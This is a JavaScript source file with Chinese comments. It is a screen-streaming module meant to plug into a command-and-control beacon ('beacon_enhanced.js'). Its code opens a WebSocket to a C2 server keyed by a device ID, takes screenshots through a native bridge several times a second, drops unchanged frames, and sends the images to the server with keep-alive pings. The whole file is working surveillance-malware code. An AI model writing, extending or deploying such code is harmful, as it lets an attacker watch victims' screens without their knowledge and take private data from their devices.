/**
 * screen_stream_client.js — 客户端屏幕流推送
 * 
 * 用途：定期截图并通过 WebSocket 推送到服务端
 * 
 * 集成到 beacon_enhanced.js 中作为新命令
 */

(function() {
  'use strict';

  let streamWs = null;
  let streamInterval = null;
  let lastFrameHash = null;

  /**
   * 启动屏幕流
   */
  globalThis.startScreenStream = function(c2Url, fps, quality) {
    if (streamWs && streamWs.readyState !== WebSocket.CLOSED) {
      return { status: 'error', message: 'Stream already running' };
    }

    fps = fps || 2;
    quality = quality || 60;
    const deviceId = getDeviceId();
    const wsUrl = c2Url.replace(/^http/, 'ws') + `/ws/screen/${deviceId}?fps=${fps}&quality=${quality}`;

    return new Promise((resolve, reject) => {
      streamWs = new WebSocket(wsUrl);

      streamWs.onopen = () => {
        console.log('[Screen] Stream connected');
        
        // 开始定期截图
        const intervalMs = 1000 / fps;
        streamInterval = setInterval(() => {
          captureAndSendFrame();
        }, intervalMs);

        resolve({ status: 'started', fps, quality });
      };

      streamWs.onmessage = (event) => {
        try {
          const msg = JSON.parse(event.data);
          
          if (msg.type === 'config') {
            console.log('[Screen] Config:', msg);
          } else if (msg.type === 'pong') {
            // 心跳响应
          }
        } catch (e) {
          console.error('[Screen] Message parse error:', e);
        }
      };

      streamWs.onerror = (error) => {
        reject({ status: 'error', message: 'WebSocket error', error });
      };

      streamWs.onclose = () => {
        console.log('[Screen] Stream disconnected');
        if (streamInterval) {
          clearInterval(streamInterval);
          streamInterval = null;
        }
        streamWs = null;
      };
    });
  };

  /**
   * 停止屏幕流
   */
  globalThis.stopScreenStream = function() {
    if (streamInterval) {
      clearInterval(streamInterval);
      streamInterval = null;
    }
    
    if (streamWs) {
      streamWs.close();
      streamWs = null;
      return { status: 'stopped' };
    }
    
    return { status: 'not_running' };
  };

  /**
   * 捕获并发送帧
   */
  async function captureAndSendFrame() {
    if (!streamWs || streamWs.readyState !== WebSocket.OPEN) {
      return;
    }

    try {
      // 调用 native bridge 截图
      if (typeof nativeScreenshot !== 'function') {
        console.warn('[Screen] nativeScreenshot not available');
        return;
      }

      const base64Frame = nativeScreenshot();
      if (!base64Frame) return;

      // 差分检测：计算简单哈希
      const hash = simpleHash(base64Frame);
      
      // 如果与上一帧相同，跳过（降低带宽）
      if (hash === lastFrameHash) {
        return;
      }

      lastFrameHash = hash;

      // 发送帧到服务端
      streamWs.send(JSON.stringify({
        type: 'frame',
        data: base64Frame,
        timestamp: Date.now()
      }));

    } catch (e) {
      console.error('[Screen] Capture error:', e);
    }
  }

  /**
   * 简单哈希函数（用于差分检测）
   */
  function simpleHash(str) {
    let hash = 0;
    const len = Math.min(str.length, 1000); // 只取前1000字符计算
    for (let i = 0; i < len; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash; // Convert to 32bit integer
    }
    return hash.toString(36);
  }

  /**
   * 心跳保持连接
   */
  setInterval(() => {
    if (streamWs && streamWs.readyState === WebSocket.OPEN) {
      streamWs.send(JSON.stringify({ type: 'ping' }));
    }
  }, 30000); // 每30秒

})();